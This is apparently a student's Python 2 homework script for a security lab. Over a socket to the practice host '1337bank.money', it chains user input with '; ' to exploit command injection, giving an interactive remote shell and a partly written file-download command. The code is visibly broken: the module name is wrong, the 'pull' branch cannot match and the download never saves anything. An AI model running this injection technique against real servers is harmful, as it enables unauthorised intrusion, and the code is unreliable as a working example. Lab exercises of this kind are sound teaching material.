"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import Sockets
import sys
import os.path

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    if(cmd == "quit"):
        sys.exit()
    elif cmd == "help":
        print("shell -  Drop into an interactive shell and allow users to gracefully exit\n pull <remote-path> <local-path> - Download files\n help - Shows this help menu\n quit - Quit the shell")
    else:
        stringInput = ""
        currDirectory = "root"
        while True:
            if currDirectory == "root":
                string = raw_input("/> ")

                if string == "exit":
                    break

                stringInput += "; " + string

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,port))

                s.send(stringInput)
                data = s.recv(1024)
                print(data)

            else:
                string = raw_input(currDirectory + "> ")
                if string == "exit":
                    break

                stringInput += "; " + string

                stringArr = string.split(" ")

                if stringArr[0] == "cd":
                    if stringArr[1] == None:
                        currDirectory = "root"
                    else:
                        currDirectory = stringArr[1]

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host,port))

                s.send(stringInput)
                data = s.recv(1024)
                print(data)


def execute_pull(cmd, cmd_arg1, cmd_arg2):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    string_arg1 = "; " + cmd_arg1
    s.send(string_arg1)
    data = s.recv(1024)




if __name__ == '__main__':
    
    while True:
        string = raw_input("> ")
        if string == "shell" or string == "quit" or string == "help":
            execute_cmd(string)
        elif string == "pull":
            stringArr = string.split(" ")
            execute_pull(stringArr[0], stringArr[1], stringArr[2])
        else:
            print("Command was invalid, Please enter \" shell, pull, help, or quit\"")
